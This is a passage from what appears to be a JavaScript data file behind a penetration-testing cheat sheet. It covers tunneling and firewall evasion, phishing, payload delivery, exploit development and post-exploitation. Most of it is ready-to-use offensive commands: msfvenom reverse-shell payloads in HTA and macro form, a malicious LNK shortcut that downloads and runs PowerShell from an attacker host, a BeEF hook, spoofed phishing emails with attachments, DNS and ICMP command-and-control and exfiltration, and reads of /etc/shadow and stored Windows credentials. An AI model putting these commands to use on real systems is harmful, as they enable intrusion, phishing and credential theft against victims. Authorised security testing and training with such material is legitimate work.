          { title: "Steghide Embed Data", cmd: "steghide embed -cf cover_image.jpg -ef secret.txt -p <PASSWORD>", tags: ["advanced"], desc: "Hide a file inside an image using steganography" },
          { title: "Steghide Extract Data", cmd: "steghide extract -sf stego_image.jpg -p <PASSWORD>", tags: ["advanced"], desc: "Extract hidden data from a steganographic image" },
          { title: "Exiftool Embed in Metadata", cmd: "exiftool -Comment='<DATA>' image.jpg", tags: ["advanced"], desc: "Embed data in image EXIF metadata" },
          { title: "Exiftool Read Metadata", cmd: "exiftool image.jpg", tags: ["tool"], desc: "Read all metadata from a file" }
        ]
      }
    ]
  },

  // ─── 19. Protocol Tunneling & Firewall Evasion ───
  {
    id: "dpi-evasion",
    name: "Protocol Tunneling & Firewall Evasion",
    icon: "🔐",
    description: "Bypass firewalls and deep packet inspection using protocol tunneling techniques",
    subcategories: [
      {
        name: "HTTP/HTTPS Tunneling",
        commands: [
          { title: "Chisel Server (Attacker)", cmd: "chisel server --reverse --port 8080", tags: ["essential"], desc: "Start Chisel server in reverse mode for client connections" },
          { title: "Chisel Client Reverse SOCKS", cmd: "chisel client <ATTACKER_IP>:8080 R:socks", tags: ["essential"], desc: "Create reverse SOCKS5 proxy through Chisel" },
          { title: "Chisel Client Reverse Port Forward", cmd: "chisel client <ATTACKER_IP>:8080 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>", tags: ["essential"], desc: "Reverse port forward a specific service through Chisel" },
          { title: "Chisel Client Forward SOCKS", cmd: "chisel client <ATTACKER_IP>:8080 socks", tags: ["tool"], desc: "Create forward SOCKS proxy through Chisel" },
          { title: "Chisel Client (HTTPS)", cmd: "chisel client --tls-skip-verify https://<ATTACKER_IP>:8443 R:socks", tags: ["advanced"], desc: "Tunnel Chisel through HTTPS to evade DPI" },
          { title: "HTTPTunnel Server (Attacker)", cmd: "hts -F 127.0.0.1:<LOCAL_PORT> <LISTEN_PORT>", tags: ["tool"], desc: "Start HTTPTunnel server forwarding to a local service" },
          { title: "HTTPTunnel Client (Target)", cmd: "htc -F <LOCAL_PORT> <ATTACKER_IP>:<LISTEN_PORT>", tags: ["tool"], desc: "Connect through HTTPTunnel from target" },
          { title: "Neo-reGeorg Generate Tunnel", cmd: "python3 neoreg.py generate -k <PASSWORD>", tags: ["advanced"], desc: "Generate web shell tunnel files for various languages" },
          { title: "Neo-reGeorg Connect", cmd: "python3 neoreg.py -k <PASSWORD> -u http://<TARGET_IP>/tunnel.php", tags: ["advanced"], desc: "Connect to deployed Neo-reGeorg web tunnel" },
          { title: "Tunna Setup", cmds: ["# Upload conn.aspx/conn.php to target web server", "python2 proxy.py -u http://<TARGET_IP>/conn.php -l <LOCAL_PORT> -r <REMOTE_PORT> -a <TARGET_INTERNAL_IP>"], tags: ["advanced"], desc: "HTTP tunnel via deployed web shell for port forwarding" },
          { title: "ABPTTS Tunnel", cmds: ["python2 abpttsfactory.py -o webshell", "# Upload generated webshell to target", "python2 abpttsclient.py -c config.txt -u http://<TARGET_IP>/abptts.aspx -f 127.0.0.1:<LOCAL_PORT>/<TARGET_INTERNAL_IP>:<REMOTE_PORT>"], tags: ["advanced"], desc: "TCP tunneling over HTTP using ABPTTS" }
        ]
      },
      {
        name: "DNS Tunneling",
        commands: [
          { title: "dnscat2 Server", cmd: "ruby dnscat2.rb <ATTACKER_DOMAIN> --secret=<SECRET>", tags: ["essential"], desc: "Start dnscat2 C2 server listening for DNS queries" },
          { title: "dnscat2 Client", cmd: "dnscat --secret=<SECRET> <ATTACKER_DOMAIN>", tags: ["essential"], desc: "Connect to dnscat2 server from target via DNS" },
          { title: "dnscat2 PowerShell Client", cmd: "Start-Dnscat2 -Domain <ATTACKER_DOMAIN> -PreSharedSecret <SECRET>", tags: ["tool"], desc: "Connect to dnscat2 from Windows via PowerShell" },
          { title: "Iodine Server", cmd: "sudo iodined -f -c -P <PASSWORD> 10.0.0.1/24 <TUNNEL_DOMAIN>", tags: ["essential"], desc: "Start iodine DNS tunnel server with virtual IP range" },
          { title: "Iodine Client", cmd: "sudo iodine -f -P <PASSWORD> <TUNNEL_DOMAIN>", tags: ["essential"], desc: "Connect to iodine DNS tunnel from target" },
          { title: "dns2tcp Server", cmd: "dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf", tags: ["tool"], desc: "Start dns2tcp daemon for DNS tunneling" },
          { title: "dns2tcp Client", cmd: "dns2tcpc -r ssh -z <ATTACKER_DOMAIN> <DNS_SERVER> -l <LOCAL_PORT>", tags: ["tool"], desc: "Connect to dns2tcp and forward SSH through DNS" }
        ]
      },
      {
        name: "ICMP Tunneling",
        commands: [
          { title: "icmpsh Server (Attacker)", cmds: ["sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1", "python3 icmpsh_m.py <ATTACKER_IP> <TARGET_IP>"], tags: ["essential"], desc: "Start ICMP shell listener (disable kernel ICMP replies first)" },
          { title: "icmpsh Client (Windows Target)", cmd: "icmpsh.exe -t <ATTACKER_IP>", tags: ["essential"], desc: "Connect ICMP reverse shell from Windows target" },
          { title: "ptunnel-ng Server", cmd: "sudo ptunnel-ng -r<ATTACKER_IP> -R22", tags: ["essential"], desc: "Start ICMP tunnel server forwarding to SSH" },
          { title: "ptunnel-ng Client", cmd: "sudo ptunnel-ng -p<ATTACKER_IP> -l<LOCAL_PORT> -r<TARGET_IP> -R<REMOTE_PORT>", tags: ["essential"], desc: "Connect through ICMP tunnel to reach remote service" },
          { title: "Nping ICMP Data Exfil", cmd: "nping --icmp -c 1 --data-string '<DATA>' <ATTACKER_IP>", tags: ["advanced"], desc: "Embed data in ICMP packets via nping" }
        ]
      },
      {
        name: "Deep Packet Inspection Bypass",
        commands: [
          { title: "stunnel Client Config", cmds: ["# stunnel.conf:", "# [tunnel]", "# client = yes", "# accept = 127.0.0.1:<LOCAL_PORT>", "# connect = <ATTACKER_IP>:<REMOTE_PORT>", "stunnel /etc/stunnel/stunnel.conf"], tags: ["tool"], desc: "Wrap arbitrary TCP traffic in SSL using stunnel" },
          { title: "OpenSSL as Encrypted Tunnel", cmds: ["# On attacker (server):", "openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>", "# On target (client):", "openssl s_client -quiet -connect <ATTACKER_IP>:<PORT>"], tags: ["tool"], desc: "Create an encrypted communication channel via OpenSSL" },
          { title: "Socat SSL Tunnel (Server)", cmd: "socat OPENSSL-LISTEN:<PORT>,cert=server.pem,cafile=client.crt,reuseaddr,fork TCP4:127.0.0.1:<LOCAL_PORT>", tags: ["advanced"], desc: "Create an SSL listener that forwards to a local service" },
          { title: "Socat SSL Tunnel (Client)", cmd: "socat TCP4-LISTEN:<LOCAL_PORT>,reuseaddr,fork OPENSSL:<ATTACKER_IP>:<PORT>,cert=client.pem,cafile=server.crt", tags: ["advanced"], desc: "Connect to a socat SSL tunnel and expose locally" },
          { title: "SSH Over HTTP (corkscrew)", cmd: "ssh -o ProxyCommand='corkscrew <PROXY_IP> <PROXY_PORT> %h %p' <USER>@<ATTACKER_IP>", tags: ["advanced"], desc: "Tunnel SSH through an HTTP proxy using corkscrew" },
          { title: "SSH Dynamic SOCKS (DPI Evasion)", cmd: "ssh -D 1080 -o 'ProxyCommand=openssl s_client -quiet -connect <ATTACKER_IP>:443' <USER>@127.0.0.1", tags: ["advanced"], desc: "Dynamic SOCKS proxy over SSL-wrapped SSH to evade DPI" }
        ]
      }
    ]
  },

  // ─── 20. Social Engineering & Phishing ───
  {
    id: "social-eng",
    name: "Social Engineering & Phishing",
    icon: "🎣",
    description: "Phishing infrastructure, credential harvesting, and social engineering tools",
    subcategories: [
      {
        name: "Phishing Infrastructure",
        commands: [
          { title: "GoPhish Launch", cmd: "sudo ./gophish", tags: ["essential"], desc: "Start GoPhish phishing framework (default admin: https://127.0.0.1:3333)" },
          { title: "SET (Social Engineering Toolkit)", cmd: "sudo setoolkit", tags: ["essential"], desc: "Launch the Social Engineering Toolkit interactive menu" },
          { title: "SET Website Clone + Credential Harvest", cmds: ["# In setoolkit:", "# 1) Social-Engineering Attacks", "# 2) Website Attack Vectors", "# 3) Credential Harvester Attack Method", "# 2) Site Cloner", "# Enter your IP and target URL"], tags: ["essential"], desc: "Clone a website and capture submitted credentials" },
          { title: "King Phisher Server", cmd: "sudo king-phisher-server -L INFO", tags: ["tool"], desc: "Start King Phisher phishing campaign server" },
          { title: "Evilginx2 Launch", cmd: "sudo evilginx2 -p /path/to/phishlets", tags: ["essential"], desc: "Start Evilginx2 reverse proxy for session hijacking phishing" },
          { title: "Evilginx2 Setup Phishlet", cmds: ["config domain <PHISHING_DOMAIN>", "config ip <ATTACKER_IP>", "phishlets hostname <PHISHLET_NAME> <PHISHING_SUBDOMAIN>", "phishlets enable <PHISHLET_NAME>", "lures create <PHISHLET_NAME>", "lures get-url <LURE_ID>"], tags: ["advanced"], desc: "Configure Evilginx2 phishlet for MitM credential and session capture" },
          { title: "Modlishka Launch", cmd: "sudo ./Modlishka -config modlishka.json", tags: ["advanced"], desc: "Start Modlishka reverse proxy phishing framework" },
          { title: "Simple HTTPS Phishing Server", cmd: "python3 -m http.server 443 --directory /path/to/phishing/site/", tags: ["tool"], desc: "Quick and dirty hosting for phishing pages" }
        ]
      },
      {
        name: "Email Reconnaissance",
        commands: [
          { title: "Check SPF Record", cmd: "dig TXT <DOMAIN> | grep spf", tags: ["essential"], desc: "Check the SPF record for email sender validation" },
          { title: "Check DKIM Record", cmd: "dig TXT selector1._domainkey.<DOMAIN>", tags: ["essential"], desc: "Look up DKIM selector DNS record" },
          { title: "Check DMARC Record", cmd: "dig TXT _dmarc.<DOMAIN>", tags: ["essential"], desc: "Check DMARC policy for the target domain" },
          { title: "Check MX Records", cmd: "dig MX <DOMAIN>", tags: ["essential"], desc: "Look up mail exchange servers for the domain" },
          { title: "Full Email Security Check", cmds: ["dig MX <DOMAIN> +short", "dig TXT <DOMAIN> | grep -i spf", "dig TXT _dmarc.<DOMAIN> +short", "dig TXT selector1._domainkey.<DOMAIN> +short"], tags: ["essential"], desc: "Comprehensive email security record enumeration" },
          { title: "Verify Email via SMTP", cmds: ["swaks --to <EMAIL> --server <MX_SERVER> --quit-after RCPT"], tags: ["tool"], desc: "Verify if an email address exists via SMTP RCPT TO" },
          { title: "theHarvester Email Enum", cmd: "theHarvester -d <DOMAIN> -b google,linkedin,bing -l 500", tags: ["essential"], desc: "Enumerate email addresses from public sources" }
        ]
      },
      {
        name: "Credential Harvesting",
        commands: [
          { title: "SWAKS SMTP Test", cmd: "swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <MX_SERVER> --header 'Subject: Important Update' --body 'Please visit http://<ATTACKER_IP>/login'", tags: ["essential"], desc: "Send a test phishing email via SMTP" },
          { title: "SWAKS with Attachment", cmd: "swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <MX_SERVER> --header 'Subject: Invoice' --body 'See attached.' --attach /path/to/payload.docm", tags: ["tool"], desc: "Send phishing email with malicious attachment" },
          { title: "BeEF Hook Script", cmd: "<script src=\"http://<ATTACKER_IP>:3000/hook.js\"></script>", tags: ["tool"], desc: "Browser Exploitation Framework hook to inject in phishing pages" },
          { title: "BeEF Start", cmd: "sudo beef-xss", tags: ["tool"], desc: "Start the Browser Exploitation Framework" },
          { title: "PHP Credential Logger", cmd: "php -S 0.0.0.0:80 -t /path/to/phishing/site/", tags: ["tool"], desc: "Serve phishing page with PHP backend for credential capture" },
          { title: "Responder for WPAD Capture", cmd: "sudo responder -I <INTERFACE> -wFb", tags: ["tool"], desc: "Capture credentials via WPAD proxy auto-discovery" }
        ]
      },
      {
        name: "Payload Delivery",
        commands: [
          { title: "HTA Payload Generator (msfvenom)", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f hta-psh -o payload.hta", tags: ["essential"], desc: "Generate an HTA file that executes PowerShell meterpreter" },
          { title: "Macro Payload (msfvenom)", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba-exe", tags: ["essential"], desc: "Generate VBA macro code for embedding in Office documents" },
          { title: "VBA Macro Payload (Raw PS)", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba", tags: ["tool"], desc: "Generate VBA payload for macro-enabled documents" },
          { title: "URL File Payload", cmds: ["# Create a .url file:", "echo '[InternetShortcut]' > payload.url", "echo 'URL=file://<ATTACKER_IP>/share/payload.exe' >> payload.url"], tags: ["tool"], desc: "Create a .url file pointing to a remote payload" },
          { title: "LNK Payload (PowerShell)", cmd: "powershell -c \"$s=New-Object -ComObject WScript.Shell;$sc=$s.CreateShortcut('C:\\Temp\\legit.lnk');$sc.TargetPath='powershell.exe';$sc.Arguments='-w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')';$sc.IconLocation='C:\\Windows\\System32\\shell32.dll,3';$sc.Save()\"", tags: ["advanced"], desc: "Create a malicious LNK shortcut with hidden PowerShell execution" },
          { title: "URL Shortener with Redirect", cmd: "# Use services like bit.ly / tinyurl to mask phishing URLs", tags: ["tool"], desc: "Shorten and cloak phishing URLs for click-through" },
          { title: "Generate Office Macro (Unicorn)", cmd: "python3 unicorn.py windows/meterpreter/reverse_tcp <ATTACKER_IP> <PORT> macro", tags: ["tool"], desc: "Generate obfuscated PowerShell macro payload with Unicorn" },
          { title: "ISO Payload Container", cmds: ["# Package payload inside an ISO to bypass MOTW:", "mkisofs -o payload.iso -J -r /path/to/payload/"], tags: ["advanced"], desc: "Package payload in ISO to bypass Mark of the Web" }
        ]
      }
    ]
  },

  // ─── 21. Exploit Research & Development ───
  {
    id: "exploit-dev",
    name: "Exploit Research & Development",
    icon: "💣",
    description: "Find, adapt, compile, and develop exploits for penetration testing",
    subcategories: [
      {
        name: "Finding Public Exploits",
        commands: [
          { title: "SearchSploit Basic Search", cmd: "searchsploit <KEYWORD>", tags: ["essential"], desc: "Search Exploit-DB for exploits matching a keyword" },
          { title: "SearchSploit Exact Title Match", cmd: "searchsploit -t <KEYWORD>", tags: ["tool"], desc: "Search only in exploit titles for exact matches" },
          { title: "SearchSploit Copy Exploit", cmd: "searchsploit -m <EXPLOIT_ID>", tags: ["essential"], desc: "Copy an exploit to the current working directory" },
          { title: "SearchSploit Examine Exploit", cmd: "searchsploit -x <EXPLOIT_PATH>", tags: ["essential"], desc: "View the exploit code without copying" },
          { title: "SearchSploit Update Database", cmd: "searchsploit --update", tags: ["essential"], desc: "Update the local Exploit-DB database" },
          { title: "SearchSploit JSON Output", cmd: "searchsploit -j <KEYWORD>", tags: ["tool"], desc: "Output search results in JSON format" },
          { title: "SearchSploit Exclude Terms", cmd: "searchsploit <KEYWORD> --exclude='DoS'", tags: ["tool"], desc: "Search but exclude denial of service exploits" },
          { title: "SearchSploit by Platform", cmd: "searchsploit -p linux <KEYWORD>", tags: ["tool"], desc: "Filter exploits by platform" },
          { title: "GitHub CVE Search", cmd: "# Search github.com/topics/<CVE_ID> or github.com/search?q=<CVE_ID>", tags: ["essential"], desc: "Search GitHub for CVE proof-of-concept exploits" },
          { title: "Google Dork for Exploits", cmd: "# site:github.com inurl:CVE-<YEAR>-<ID> OR site:exploit-db.com <SOFTWARE> <VERSION>", tags: ["tool"], desc: "Google dork to find public exploits across the web" }
        ]
      },
      {
        name: "Adapting & Compiling",
        commands: [
          { title: "Cross-Compile for Windows x64", cmd: "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32", tags: ["essential"], desc: "Compile C exploit for 64-bit Windows from Linux" },
          { title: "Cross-Compile for Windows x86", cmd: "i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32", tags: ["essential"], desc: "Compile C exploit for 32-bit Windows from Linux" },
          { title: "Compile for Linux x64", cmd: "gcc exploit.c -o exploit", tags: ["essential"], desc: "Compile C exploit for Linux 64-bit" },
          { title: "Compile for Linux x86", cmd: "gcc -m32 exploit.c -o exploit", tags: ["tool"], desc: "Compile C exploit for Linux 32-bit" },
          { title: "Static Compile (No Dependencies)", cmd: "gcc exploit.c -o exploit -static", tags: ["essential"], desc: "Statically link exploit to avoid library dependency issues" },
          { title: "Python 2 to 3 Conversion", cmd: "2to3 -w exploit.py", tags: ["essential"], desc: "Convert Python 2 exploit to Python 3 syntax" },
          { title: "Install Python Dependencies", cmd: "pip3 install requests pycryptodome impacket", tags: ["tool"], desc: "Install common Python modules needed by exploits" },
          { title: "Compile with Debug Symbols", cmd: "gcc -g exploit.c -o exploit", tags: ["tool"], desc: "Compile with debug info for troubleshooting" },
          { title: "Cross-Compile (Static Windows)", cmd: "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -static", tags: ["tool"], desc: "Statically compile for Windows to avoid DLL issues" },
          { title: "Compile C++ Exploit", cmd: "g++ exploit.cpp -o exploit -lstdc++", tags: ["tool"], desc: "Compile a C++ exploit for Linux" }
        ]
      },
      {
        name: "Buffer Overflow Basics",
        commands: [
          { title: "Generate Cyclic Pattern", cmd: "msf-pattern_create -l <LENGTH>", tags: ["essential"], desc: "Generate a unique pattern for offset identification" },
          { title: "Find Pattern Offset", cmd: "msf-pattern_offset -l <LENGTH> -q <EIP_VALUE>", tags: ["essential"], desc: "Calculate the exact offset from a pattern match in EIP/RIP" },
          { title: "Generate Bad Characters", cmd: "python3 -c \"import sys; sys.stdout.buffer.write(bytes(range(1,256)))\" > badchars.bin", tags: ["essential"], desc: "Generate all byte values (0x01-0xFF) for bad character analysis" },
          { title: "msfvenom Bad Char Shellcode", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b '\\x00\\x0a\\x0d' -f python -v shellcode", tags: ["essential"], desc: "Generate shellcode excluding specified bad characters" },
          { title: "Mona Find JMP ESP", cmd: "!mona find -s '\\xff\\xe4' -m <MODULE_NAME>", tags: ["essential"], desc: "Find JMP ESP instruction address in a loaded module", note: "Run inside Immunity Debugger" },
          { title: "Mona List Modules", cmd: "!mona modules", tags: ["essential"], desc: "List all loaded modules with memory protections (ASLR, DEP, etc.)" },
          { title: "Mona Generate Bytearray", cmd: "!mona bytearray -cpb '\\x00'", tags: ["essential"], desc: "Generate a byte array excluding null bytes for bad char testing" },
          { title: "Mona Compare Bytearray", cmd: "!mona compare -f C:\\mona\\bytearray.bin -a <ESP_ADDRESS>", tags: ["essential"], desc: "Compare memory with bytearray to identify bad characters" },
          { title: "Mona Suggest Gadgets (ROP)", cmd: "!mona rop -m <MODULE_NAME>", tags: ["advanced"], desc: "Find ROP gadgets for DEP bypass" },
          { title: "Check Binary Protections", cmd: "checksec --file=<BINARY>", tags: ["essential"], desc: "Check NX, ASLR, PIE, canary, and RELRO protections" }
        ]
      },
      {
        name: "Scripting Exploits",
        commands: [
          { title: "Python struct.pack (Little Endian)", cmd: "python3 -c \"import struct; print(struct.pack('<I', 0x<ADDRESS>))\"", tags: ["essential"], desc: "Pack an address in little-endian format for exploit payload" },
          { title: "Python struct.pack (64-bit)", cmd: "python3 -c \"import struct; print(struct.pack('<Q', 0x<ADDRESS>))\"", tags: ["tool"], desc: "Pack a 64-bit address in little-endian format" },
          { title: "Pwntools Basic Template", cmds: ["from pwn import *", "context.binary = ELF('./<BINARY>')", "p = process('./<BINARY>')  # or remote('<TARGET_IP>', <PORT>)", "payload = b'A' * <OFFSET>", "payload += p64(<RETURN_ADDRESS>)", "p.sendline(payload)", "p.interactive()"], tags: ["essential"], desc: "Basic pwntools exploit template for buffer overflows" },
          { title: "Pwntools Remote Exploit", cmd: "python3 -c \"from pwn import *; r=remote('<TARGET_IP>',<PORT>); r.sendline(b'A'*<OFFSET> + p64(<ADDRESS>)); r.interactive()\"", tags: ["essential"], desc: "Quick one-liner remote exploit with pwntools" },
          { title: "Pwntools Shellcraft", cmds: ["from pwn import *", "context.arch = 'amd64'  # or 'i386'", "shellcode = asm(shellcraft.sh())", "print(f'Shellcode length: {len(shellcode)}')"], tags: ["tool"], desc: "Generate shellcode using pwntools shellcraft" },
          { title: "Pwntools Find ROP Gadgets", cmds: ["from pwn import *", "elf = ELF('./<BINARY>')", "rop = ROP(elf)", "print(rop.dump())"], tags: ["advanced"], desc: "Enumerate ROP gadgets with pwntools" },
          { title: "Python Socket Exploit Template", cmds: ["import socket", "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", "s.connect(('<TARGET_IP>', <PORT>))", "payload = b'A' * <OFFSET> + b'<SHELLCODE>'", "s.send(payload)", "s.close()"], tags: ["essential"], desc: "Basic Python socket template for network exploits" },
          { title: "Generate NOP Sled", cmd: "python3 -c \"print(b'\\x90' * <LENGTH>)\"", tags: ["essential"], desc: "Generate a NOP sled for shellcode alignment" }
        ]
      }
    ]
  },

  // ─── 22. Engagement Methodology & Playbook ───
  {
    id: "pentest-workflow",
    name: "Engagement Methodology & Playbook",
    icon: "🧩",
    description: "Structured pentest workflow, service checklists, and engagement methodology",
    subcategories: [
      {
        name: "Phase 1 — Reconnaissance Checklist",
        commands: [
          { title: "Full Nmap Workflow — Discovery", cmd: "nmap -sn <TARGET_RANGE> -oG discovery.gnmap", tags: ["essential"], desc: "Step 1: Host discovery scan across the target range" },
          { title: "Full Nmap Workflow — All Ports", cmd: "nmap -p- --min-rate 5000 -oN allports.txt <TARGET_IP>", tags: ["essential"], desc: "Step 2: Scan all 65535 TCP ports quickly" },
          { title: "Full Nmap Workflow — Service Enum", cmd: "nmap -sC -sV -p<OPEN_PORTS> -oN services.txt <TARGET_IP>", tags: ["essential"], desc: "Step 3: Service version and default script scan on open ports" },
          { title: "Full Nmap Workflow — Vuln Scan", cmd: "nmap --script vuln -p<OPEN_PORTS> -oN vulns.txt <TARGET_IP>", tags: ["essential"], desc: "Step 4: Run vulnerability scripts against discovered services" },
          { title: "Full Nmap Workflow — UDP Top Ports", cmd: "sudo nmap -sU --top-ports 50 --min-rate 5000 -oN udp.txt <TARGET_IP>", tags: ["essential"], desc: "Step 5: Quick scan of top UDP ports" },
          { title: "Web Enum — Identify Technology", cmd: "whatweb http://<TARGET_IP>", tags: ["essential"], desc: "Step 1: Identify web technologies, CMS, and frameworks" },
          { title: "Web Enum — Directory Brute Force", cmd: "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o dirs.txt", tags: ["essential"], desc: "Step 2: Brute force directories and files" },
          { title: "Web Enum — Nikto Scan", cmd: "nikto -h http://<TARGET_IP> -o nikto.txt", tags: ["essential"], desc: "Step 3: Automated web vulnerability scanning" },
          { title: "Web Enum — Virtual Host Discovery", cmd: "gobuster vhost -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain", tags: ["tool"], desc: "Step 4: Discover virtual hosts and subdomains" }
        ]
      },
      {
        name: "Phase 2 — Initial Access Patterns",
        commands: [
          { title: "Quick Win: Anonymous FTP", cmd: "ftp <TARGET_IP>  # Login: anonymous / anonymous", tags: ["essential"], desc: "Check for anonymous FTP access", note: "Try username: anonymous, password: anonymous or blank" },
          { title: "Quick Win: Null SMB Session", cmd: "smbclient -L //<TARGET_IP> -N", tags: ["essential"], desc: "Check for null session SMB share listing" },
          { title: "Quick Win: NFS Shares", cmds: ["showmount -e <TARGET_IP>", "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs"], tags: ["essential"], desc: "Check for exposed NFS shares and mount them" },
          { title: "Quick Win: SMTP User Enum", cmd: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>", tags: ["essential"], desc: "Enumerate valid usernames via SMTP VRFY" },
          { title: "Quick Win: Default Credentials", cmds: ["# Tomcat: tomcat/tomcat, admin/admin, tomcat/s3cret", "# Jenkins: admin/admin, admin/password", "# phpMyAdmin: root/(blank), root/root", "# WordPress: admin/admin, admin/password"], tags: ["essential"], desc: "Try common default credentials for known services", note: "Always check service-specific default creds before brute forcing" },
          { title: "Quick Win: Redis Unauthenticated", cmd: "redis-cli -h <TARGET_IP> INFO", tags: ["tool"], desc: "Check for unauthenticated Redis access" },
          { title: "Quick Win: MongoDB No Auth", cmd: "mongosh --host <TARGET_IP> --eval 'db.adminCommand({listDatabases:1})'", tags: ["tool"], desc: "Check for unauthenticated MongoDB access" },
          { title: "Quick Win: SNMP Default Community", cmd: "snmpwalk -v2c -c public <TARGET_IP>", tags: ["essential"], desc: "Check for default SNMP community string 'public'" },
          { title: "Quick Win: IPMI Hash Dump", cmd: "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; run; exit'", tags: ["tool"], desc: "Dump IPMI hashes (usually crackable)" }
        ]
      },
      {
        name: "Phase 3 — Post-Exploitation Checklist",
        commands: [
          { title: "Post-Exploit Step 1: Stabilize Shell", cmds: ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "# Ctrl+Z", "stty raw -echo; fg", "export TERM=xterm"], tags: ["essential"], desc: "Upgrade raw shell to fully interactive TTY" },
          { title: "Post-Exploit Step 2: User Context", cmds: ["whoami", "id", "hostname", "ip a"], tags: ["essential"], desc: "Establish current user context and network position" },
          { title: "Post-Exploit Step 3: Sudo Check", cmd: "sudo -l", tags: ["essential"], desc: "Check what commands the current user can run as sudo" },
          { title: "Post-Exploit Step 4: SUID Binaries", cmd: "find / -perm -4000 -type f 2>/dev/null", tags: ["essential"], desc: "Find SUID binaries for potential privilege escalation" },
          { title: "Post-Exploit Step 5: Cron Jobs", cmds: ["cat /etc/crontab", "ls -la /etc/cron.d/", "ls -la /etc/cron.daily/", "crontab -l"], tags: ["essential"], desc: "Enumerate scheduled tasks for exploitation" },
          { title: "Post-Exploit Step 6: Capabilities", cmd: "getcap -r / 2>/dev/null", tags: ["essential"], desc: "Find binaries with Linux capabilities set" },
          { title: "Post-Exploit Step 7: Kernel Info", cmd: "uname -a && cat /etc/os-release", tags: ["essential"], desc: "Check kernel version and OS for kernel exploits" },
          { title: "Post-Exploit Step 8: Network Info", cmds: ["ip a", "ip route", "ss -tulpn", "cat /etc/hosts", "arp -a"], tags: ["essential"], desc: "Enumerate network config for pivoting opportunities" },
          { title: "Post-Exploit Step 9: Sensitive Files", cmds: ["cat /etc/passwd", "cat /etc/shadow 2>/dev/null", "ls -la /home/", "find / -name '*.conf' -o -name '*.config' -o -name '*.bak' 2>/dev/null | head -30"], tags: ["essential"], desc: "Search for sensitive files, configs, and backups" },
          { title: "Windows Post-Exploit: User Info", cmds: ["whoami /all", "net user", "net localgroup administrators", "systeminfo"], tags: ["essential"], desc: "Windows equivalent of basic post-exploitation enumeration" },
          { title: "Windows Post-Exploit: Stored Creds", cmds: ["cmdkey /list", "dir C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Credentials\\", "reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password"], tags: ["essential"], desc: "Search for stored credentials and passwords in Windows" }
        ]
      },
      {
        name: "Phase 4 — Pivoting Workflow",
        commands: [
          { title: "Pivot Step 1: Discover Interfaces", cmds: ["ip a", "ip route", "arp -a", "cat /etc/resolv.conf"], tags: ["essential"], desc: "Identify dual-homed interfaces and internal networks" },
          { title: "Pivot Step 2: Internal Host Discovery", cmd: "for i in $(seq 1 254); do (ping -c 1 -W 1 <INTERNAL_SUBNET>.$i | grep 'from' &); done; wait", tags: ["essential"], desc: "Quick ping sweep of internal subnet from pivot host" },
          { title: "Pivot Step 3: Upload Tunnel Tool", cmd: "# Upload chisel/ligolo/socat to the pivot host via existing shell", tags: ["essential"], desc: "Transfer tunneling tool to the compromised host" },
          { title: "Pivot Step 4: Create SOCKS Proxy", cmds: ["# On attacker: chisel server --reverse -p 8080", "# On pivot: ./chisel client <ATTACKER_IP>:8080 R:socks"], tags: ["essential"], desc: "Establish SOCKS proxy through the pivot for proxychains" },
          { title: "Pivot Step 5: Configure Proxychains", cmd: "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf", tags: ["essential"], desc: "Add SOCKS proxy to proxychains configuration" },
          { title: "Pivot Step 6: Scan Through Proxy", cmd: "proxychains4 nmap -sT -Pn -p 21,22,80,135,139,443,445,3389,5985 <INTERNAL_TARGET> 2>/dev/null", tags: ["essential"], desc: "Port scan internal targets through the pivot" },
          { title: "SSH Dynamic Port Forward", cmd: "ssh -D 1080 -N -f <USER>@<PIVOT_IP>", tags: ["essential"], desc: "Create SOCKS proxy via SSH dynamic port forwarding" },
          { title: "SSH Local Port Forward", cmd: "ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<REMOTE_PORT> <USER>@<PIVOT_IP> -N", tags: ["essential"], desc: "Forward a specific internal service to attacker's localhost" },
          { title: "Double Pivot (SSH Chain)", cmd: "ssh -J <USER1>@<PIVOT1_IP> <USER2>@<PIVOT2_IP>", tags: ["advanced"], desc: "SSH through multiple hops using ProxyJump" }
        ]
      },
      {
        name: "Phase 5 — Proof & Reporting",
        commands: [
          { title: "Linux Proof Capture", cmds: ["echo '=== PROOF ==='", "hostname", "whoami", "id", "ip a", "cat /root/proof.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null", "date"], tags: ["essential"], desc: "Capture proof of compromise on Linux targets" },
          { title: "Windows Proof Capture", cmds: ["echo === PROOF ===", "hostname", "whoami", "ipconfig", "type C:\\Users\\Administrator\\Desktop\\proof.txt 2>nul", "date /t && time /t"], tags: ["essential"], desc: "Capture proof of compromise on Windows targets" },
          { title: "Screenshot with Timestamp (Linux)", cmd: "import -window root screenshot_$(date +%Y%m%d_%H%M%S).png", tags: ["tool"], desc: "Take a timestamped desktop screenshot on Linux" },
